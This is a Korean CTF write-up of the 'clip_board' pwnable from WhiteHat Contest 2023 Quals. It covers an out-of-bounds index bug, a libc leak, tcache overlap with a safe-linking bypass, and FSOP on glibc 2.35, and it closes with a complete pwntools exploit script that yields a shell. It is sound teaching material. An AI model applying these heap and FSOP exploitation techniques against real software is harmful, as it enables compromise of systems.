+++
title = "WhiteHat Contest 2023 Quals - clip_board"
date = "2024-08-30"
description = "WhiteHat Contest 2023 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "improper check", "fsop", "heap manipulation", "tcache unlinking", "safe linking"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/clip_board'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Concept
``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  ...
  v3 = malloc(0x20uLL);
  printf("heap leak: %p\n\n", v3);
  do
  {
    Menu();
    choice = get_int();
    switch ( choice )
    {
      case 1:
        AddClipboard();
        break;
      case 2:
        DelClipboard();
        break;
      case 3:
        ViewClipboard();
        break;
      case 4:
        exit = 1;
        break;
    }
  }
  while ( !exit );
  return 0;
}
```

`AddClipboard()`, `DelClipboard()`, `ViewClipboard()` 세 가지 기능이 heap을 기반으로 구현되어있다.
친절하게도 heap 주소를 하나 출력해주어 heap leak을 따로 해주지 않아도 된다.

### Global Variables
``` c
char *chunk_list[10];
char check_chunk_list[10];      // size = 16
int chunk_size_list[10];
```

예를 들어 `AddClipboard()` 실행 시 `index`에 `i`를 입력하면 위 구조체들에 다음과 같은 값이 설정된다.

- `chunk_list[i]` : `malloc(size)`
- `check_chunk_list[i]` : `1`
- `chunk_size_list[i]` : `size`

이 때 `check_chunk_list`는 alignment 때문인지 `16`바이트만큼 할당되어있다.


## 0x01. Vulnerability
``` c
int ViewClipboard()
{
  ...
  printf("index > ");
  index = get_int();
  if ( index <= 9 )
  {
    check = check_chunk_list_4090[index];
    if ( check )
    {
      ptr = chunk_list_4040[index];
      size = chunk_size_list_40A0[index];
      if ( ptr )
      {
        if ( size <= 0x100 )
          return write(1, ptr, size);
      }
    }
  }
  return size;
}
```

`AddClipboard()`, `DelClipboard()`, `ViewClipboard()`에서 공통적으로 `index` 값이 음수일 때를 검증하지 않아 OOB 취약점이 있다.

다만 원하는 동작을 하기 위해서 `check`가 `0`이 아닌 값을 가져야하므로, `check_chunk_list` 위 영역의 값을 잘 확인해야 한다.


## 0x02. Exploit
### Libc Leak
``` bash
gef➤  x/20gx 0x555555558000
0x555555558000: 0x0000000000000000      0x0000555555558008
0x555555558010: 0x0000000000000000      0x0000000000000000
0x555555558020 <stdout@GLIBC_2.2.5>:    0x00007ffff7fa5780      0x0000000000000000
0x555555558030 <stdin@GLIBC_2.2.5>:     0x00007ffff7fa4aa0      0x0000000000000000
0x555555558040 <chunk_list>:    0x0000000000000000      0x0000000000000000
0x555555558050 <chunk_list+16>: 0x0000000000000000      0x0000000000000000
0x555555558060 <chunk_list+32>: 0x0000000000000000      0x0000000000000000
0x555555558070 <chunk_list+48>: 0x0000000000000000      0x0000000000000000
0x555555558080 <chunk_list+64>: 0x0000000000000000      0x0000000000000000
0x555555558090 <check_chunk_list>:      0x0000000000000000      0x0000000000000000
```

`index`를 음수로 입력해 취약점을 활용하기 위해서 `chunk_list` 위 영역을 살펴보면, `stdout`과 `stdin`이 있다.

`0x555555558008` 영역에 `__dso_handle`라는 변수명으로 bss 영역의 주소가 쓰여있어 확인해보니 `fini_array`의 `__do_global_dtors_aux`에서 한번 참조하는 것을 제외하고는 참조되지 않는다.
이 문제에서는 딱히 의미가 없지만 기억해뒀다가 나중에 써먹으면 좋을 것 같다.

`stdin`은 `chunk_list[-2]`, `stdout`은 `chunk_list[-4]`로 접근이 가능한데, `ViewClipboard`로 값을 읽어오기 위해서는 `check_chunk_list[-2]`나 `check_chunk_list[-4]`에 `0`이 아닌 값이 저장되어 있어야 한다.
그렇다면 `0x55555555808e` 혹은 `0x55555555808c`에 값을 저장해야 한다는 소린데, `index`를 `9`로 입력해서 `0x555555558088`에 `malloc()`이 반환한 값을 저장한다고 해도 주소 값이라 윗 부분은 쓰이지 않을테니 `0x55555555808e`에는 `0`이 들어간다.

따라서 `stdout`만 `view`가 가능하고, 다음과 같은 payload로 libc 주소를 얻었다.

``` python
    # leak libc
    add_clipboard(s, 1, 0x10, b"A" * 0x10)
    add_clipboard(s, 9, 0x10, b"B" * 0x10)
    r = view_clipboard(s, -4)
    libc = u64(r[8:16]) - 0x21b803
    stdout_fp = r[0:0xe0]
    log.info(f"libc : {hex(libc)}")

    # clean clipboards
    del_clipboard(s, 1)
    del_clipboard(s, 9)
```

### FSOP
``` bash
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/user/clip_board
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/user/clip_board
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/user/clip_board
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/user/clip_board
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/user/clip_board
```

Full RELRO가 적용되어있기 때문에 GOT영역은 `write`가 불가능하고 `0x555555558000`와 `chunk_list`의 사이에는 `stdout`, `stdin`밖에 없다.

`stdout`, `stdin`을 바꿔서 RIP control을 해야하니 자료를 찾아보다가 FSOP 기법을 발견했다.
FSOP 기법은 [이 글](../exploiting-fsop-in-glibc-2-35/)에 정리한 내용을 사용했다.

문제에서는 `AddClipboard()` 기능을 이용하여 메모리를 마음대로 할당받을 수 있고, 처음에 heap 주소를 주었으니 offset을 계산하여 다음과 같이 payload를 작성했다.

``` python
    # allocate wide_vtable
    one_gadget = libc + 0xebc85
    payload = p64(0) * 2                        # dummy
    payload += p64(one_gadget) * 19
    add_clipboard(s, 6, len(payload), payload)
    wide_vtable = heap + 0x4a0

    # allocate anywhere can read / write
    add_clipboard(s, 7, 0x100, b"\x00" * 8)
    anywhere_rw = heap + 0x550

    # allocate wide_data
    payload = bytearray(0x100)
    payload[0x18:0x20] = p64(0)
    payload[0x20:0x28] = p64(anywhere_rw)
    payload[0x30:0x38] = p64(0)
    payload[0xe0:0xe8] = p64(wide_vtable)
    add_clipboard(s, 8, len(payload), payload)
    wide_data = heap + 0x660

    # allocate new_fp and overwrite stdout
    io_wfile_jumps = libc + 0x2170c0
    payload = bytearray(stdout_fp)
    payload[0:8] = p64(0)                       # stdout -> flags
    payload[0xa0:0xa8] = p64(wide_data)         # stdout -> _wide_data
    payload[0xc0:0xc8] = p64(1)                 # stdout -> mode
    payload[0xd8:0xe0] = p64(io_wfile_jumps)    # stdout -> vtable
    add_clipboard(s, -4, 0x100, payload, fin=1)
```

어... 신나게 설명했는데 사실 가장 큰 문제가 하나 있다.
OOB 취약점을 이용하여 `chunk_list[-4]`에 위치한 `stdout`을 overwrite하면 메모리는 다음 이미지와 같다.

![overwrite stdout](./image.png)

그런데 사실 `_IO_flush_all_lockp`는 `_IO_list_all`을 순회하며 file stream에 overflow가 발생했는지 확인하기 때문에, 공격자가 할당한 `wide_vtable`의 `one_gadget` 함수가 호출되기 위해서는 메모리가 다음 이미지와 같아져야 한다.

![overwrite stdout and unlink _IO_list_all](./image-1.png)

따라서 libc 영역에 있는 `_IO_list_all` 포인터를 overwrite 해야한다...

`stdout`에 저장된 값을 직접 접근하는 다른 FSOP 시나리오를 찾았다면 이런 짓은 하지 않았어도 됐는데 아쉬울 따름이다...

### Tcache Unlink
아예 새로운 문제를 보는 기분으로 코드를 보다보면 `DelClipboard()`에서 다음 동작을 수행하는 것을 확인할 수 있다.

``` c
int DelClipboard()
{
  ...
      ptr = chunk_list_4040[index];
      if ( ptr )
      {
        free(ptr);
        chunk_list_4040[index] = 0LL;
        check_chunk_list_4090[index] = 0;
        size = chunk_size_list_40A0;
        chunk_size_list_40A0[index] = 0;
      }
  ...
}
```

`AddClipboard()`에서 `1`로 설정된 `check_chunk_list[index]`의 값을 `0`으로 돌려준다.

`check_chunk_list` 위에는 `malloc()`으로 할당받은 heap 영역의 주소들이 쓰여있다.
만약 `malloc()`, `free()`를 하는 순서가 같으면 offset도 동일할 것이므로, 할당받은 주소를 leak하지 않더라도 예측할 수 있다.

따라서 `malloc`이 `0xXXXXXXXXXX10` 주소를 반환하게끔 heap을 정렬시켜두고, `0xXXXXXXXXXX00` 주소에 fake chunk header를 만들어준 다음, 주소의 마지막 바이트인 `0x10`을 `0x00`으로 만들어주면 fake chunk를 `free()`시킬 수 있다.

``` python
    # align last byte
    add_clipboard(s, -8, 0xc0, b"C" * 0x20)

    # make fake chunk header
    payload = b"D" * 0x10
    payload += p64(0)
    payload += p64(0x101)
    add_clipboard(s, 0, 0x20, payload)

    # allocate XXXXXXXXX410, XXXXXXXXX440, XXXXXXXXX470 chunks
    add_clipboard(s, 9, 0x20, b"E" * 0x30)
    add_clipboard(s, 1, 0x20, b"F" * 0x20)
    add_clipboard(s, 2, 0x20, b"G" * 0x20)

    # overwrite 410 -> 400 and free fake chunk (size 0x100)
    del_clipboard(s, -8)
    del_clipboard(s, 9)

    # free XXXXXXXXX440, XXXXXXXXX470
    del_clipboard(s, 2)
    del_clipboard(s, 1)
```

위와 같이 payload를 작성하고 코드를 실행하고 tcache에서 사이즈 `0x30`, `0x100` bin을 확인해보면 다음과 같다.

``` bash
─────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────
Tcachebins[idx=1, size=0x30, count=2] ←  Chunk(addr=0x555555559440, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
                                      ←  Chunk(addr=0x555555559470, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Tcachebins[idx=14, size=0x100, count=1] ←  Chunk(addr=0x555555559400, size=0x100, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
```

이렇게 `0x555555559400` 영역이 `0x555555559440`, `0x555555559470` 영역과 겹치게 되기 때문에 `0xf0`짜리 chunk를 요청하면 `0x555555559440`의 `fd`를 overwrite할 수 있다.

### Safe Linking Bypass
그런데 이 때 `0x555555559440`과 `0x555555559470`의 `fd`를 확인해보면 단순히 다음 chunk의 주소를 저장하지 않는데, 이는 tcache의 safe linking 때문이다.

``` bash
gef➤  x/6gx 0x555555559440 - 0x10
0x555555559430: 0x0000000000000000      0x0000000000000031
0x555555559440: 0x000055500000c129      0x62cde40f9bbc5877
0x555555559450: 0x4646464646464646      0x4646464646464646
gef➤  x/6gx 0x555555559470 - 0x10
0x555555559460: 0x0000000000000000      0x0000000000000031
0x555555559470: 0x0000000555555559      0x62cde40f9bbc5877
0x555555559480: 0x4747474747474747      0x4747474747474747
```

공부한김에 간략하게 정리하자면 glibc 2.32버전부터 `free`된 chunk는 다음과 같은 구조를 가지게 된다.

``` c
struct tcache_entry {
    struct tcache_entry *next;
    /* This field exists to detect double frees.  */
    struct tcache_perthread_struct *key;
};
```

위 메모리에서 `0x62cde40f9bbc5877`로 출력된 것이 `key`인데, 다음과 같은 로직을 통해 double free를 방지한다.

1. `free(ptr)`을 했을 때,
2. `ptr->key`에 제대로 된 `key`값이 있는지 검증
   - 없다면 `abort`
3. 제대로 된 `key` 값이 있다면, `ptr`의 `size`에 맞는 tcache bin을 순회
   - `ptr`이 bin에 있다면 `abort`

문제는 `next`인데, glibc 버전에 따라 다르겠지만 2.35의 경우 포인터 마스킹 또는 포인터 암호화 기법이 적용되어서 다음 연산을 하고 저장한다.

``` c
// Encryption
entry->next = (tcache_entry *) ((uintptr_t) next ^ (uintptr_t) tcache);

// Decryption
tcache_entry *next = (tcache_entry *) ((uintptr_t) e->next ^ (uintptr_t) tcache);
```

여기에서 `tcache` 값은 `tcache_perthread_struct`의 주소라고 하는데... 실제 메모리와 다른 것 같아서 2.35 glibc 소스코드를 elixir에서 찾아보았는데 뭔가 안맞는 것 같아 확인이 필요하다.

아무튼 실제 xor 연산이 되는 `tcache` 값은 heap base 주소를 12bit right shift한 `0x555555559`으로, `next`가 null이어야 하는 `0x555555559470` chunk를 보면 알 수 있다.
따라서 `_IO_list_all`의 주소인 `0x7ffff7fa5680`에 `0x555555559`를 xor한 결과를 `0x555555559440` chunk의 `next` 위치에 쓰면 다음과 같이 tcache bin이 구성된다.

``` bash
─────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────
Tcachebins[idx=1, size=0x30, count=2] ←  Chunk(addr=0x555555559440, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
                                      ←  Chunk(addr=0x7ffff7fa5680, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x7ffff7fa5680]
```

`_IO_list_all`의 주소 `0x7ffff7fa5680` 8바이트 앞에 위치한 `0`이 `size`로 인식되어 corrupted chunk로 출력되지만 다행히 `malloc()` 시 `size` 검증을 하지 않아 `0x7ffff7fa5680`를 반환받는데에 성공했다.

``` python
    # reallocate fake 0x100 chunk and overwrite fd of XXXXXXXXX440
    # now XXXXXXXXX440 -> IO_list_all
    io_list_all = libc + 0x21b680
    payload = b"H" * 0x38
    payload += p64(0x31)
    payload += p64(io_list_all ^ (heap >> 12))
    add_clipboard(s, 3, 0xf0, payload)

    # allocating 5 returns address of IO_list_all
    add_clipboard(s, 4, 0x20, b"I" * 0x20)
    add_clipboard(s, 5, 0x20, p64(heap + 0x770))
```

이렇게 payload를 실행하면 목적했던 `_IO_list_all`에 생성한 `new_fd`의 주소가 담기게 된다.

``` bash
gef➤  x/gx 0x7ffff7fa5680
0x7ffff7fa5680 <_IO_list_all>:  0x0000555555559770
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "clip_board"
LIBRARY = "libc.so.6"
CONTAINER = "69049f0398fe"
code_base = 0x0000555555554000
bp = {
    'main' : code_base + 0x16FD
}

gs = f'''
gef config gef.bruteforce_main_arena True
b *0x7ffff7e1e8e0
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def add_clipboard(s, index, size, contents, fin=0):
    s.sendline(b"1")
    s.recvuntil(b"> ")
    s.sendline(str(index).encode())
    s.recvuntil(b"> ")
    s.sendline(str(size).encode())
    s.recvuntil(b"> ")
    s.send(contents)
    if fin:
        return
    else:
        return s.recvuntil(b"\n> ")

def del_clipboard(s, index):
    s.sendline(b"2")
    s.recvuntil(b"> ")
    s.sendline(str(index).encode())
    return s.recvuntil(b"\n> ")

def view_clipboard(s, index):
    s.sendline(b"3")
    s.recvuntil(b"> ")
    s.sendline(str(index).encode())
    return s.recvuntil(b"\n> ")

def exit_clipboard(s):
    s.sendline(b"4")
    return

def main(port, debug):
    if(port):
        s = remote("0.0.0.0", port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
    heap = int(s.recvuntil(b"> ").split(b'\n')[0].split(b': ')[1], 16) & 0xfffffffffffff000
    log.info(f"heap : {hex(heap)}")
    
    # leak libc
    add_clipboard(s, 1, 0x10, b"A" * 0x10)
    add_clipboard(s, 9, 0x10, b"B" * 0x10)
    r = view_clipboard(s, -4)
    libc = u64(r[8:16]) - 0x21b803
    stdout_fp = r[0:0xe0]
    log.info(f"libc : {hex(libc)}")

    # clean clipboards
    del_clipboard(s, 1)
    del_clipboard(s, 9)

    # align last byte
    add_clipboard(s, -8, 0xc0, b"C" * 0x20)

    # make fake chunk header
    payload = b"D" * 0x10
    payload += p64(0)
    payload += p64(0x101)
    add_clipboard(s, 0, 0x20, payload)

    # allocate XXXXXXXXX410, XXXXXXXXX440, XXXXXXXXX470 chunks
    add_clipboard(s, 9, 0x20, b"E" * 0x30)
    add_clipboard(s, 1, 0x20, b"F" * 0x20)
    add_clipboard(s, 2, 0x20, b"G" * 0x20)
    
    # overwrite 410 -> 400 and free fake chunk (size 0x100)
    del_clipboard(s, -8)
    del_clipboard(s, 9)

    # free XXXXXXXXX440, XXXXXXXXX470
    del_clipboard(s, 2)
    del_clipboard(s, 1)

    # reallocate fake 0x100 chunk and overwrite fd of XXXXXXXXX440
    # now XXXXXXXXX440 -> IO_list_all
    io_list_all = libc + 0x21b680
    payload = b"H" * 0x38
    payload += p64(0x31)
    payload += p64(io_list_all ^ (heap >> 12))
    add_clipboard(s, 3, 0xf0, payload)

    # allocating 5 returns address of IO_list_all
    add_clipboard(s, 4, 0x20, b"I" * 0x20)
    add_clipboard(s, 5, 0x20, p64(heap + 0x770))
    
    # allocate wide_vtable
    one_gadget = libc + 0xebc85
    payload = p64(0) * 2                        # dummy
    payload += p64(one_gadget) * 19
    add_clipboard(s, 6, len(payload), payload)
    wide_vtable = heap + 0x4a0

    # allocate anywhere can read / write
    add_clipboard(s, 7, 0x100, b"\x00" * 8)
    anywhere_rw = heap + 0x550

    # allocate wide_data
    payload = bytearray(0x100)
    payload[0x18:0x20] = p64(0)
    payload[0x20:0x28] = p64(anywhere_rw)
    payload[0x30:0x38] = p64(0)
    payload[0xe0:0xe8] = p64(wide_vtable)
    add_clipboard(s, 8, len(payload), payload)
    wide_data = heap + 0x660

    # allocate new_fp and overwrite stdout
    io_wfile_jumps = libc + 0x2170c0
    payload = bytearray(stdout_fp)
    payload[0:8] = p64(0)                       # stdout -> flags
    payload[0xa0:0xa8] = p64(wide_data)         # stdout -> _wide_data
    payload[0xc0:0xc8] = p64(1)                 # stdout -> mode
    payload[0xd8:0xe0] = p64(io_wfile_jumps)    # stdout -> vtable
    add_clipboard(s, -4, 0x100, payload, fin=1)

    log.info(f"&stdout : 0x555555558020")
    log.info(f"IO_list_all : {hex(io_list_all)}")
    log.info(f"IO_list_all -> 0x7ffff7fab6a0")
    log.info(f"original_stdout : 0x7ffff7fab780")
    log.info(f"wide_data : {hex(wide_data)}")
    log.info(f"io_wfile_jumps : {hex(io_wfile_jumps)}")
    log.info(f"anywhere_rw : {hex(anywhere_rw)}")
    log.info(f"wide_vtable : {hex(wide_vtable)}")
    log.info(f"one_gadget : {hex(one_gadget)}")

    # trigger _IO_flush_all_lockp
    exit_clipboard(s)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.port, args.debug)
```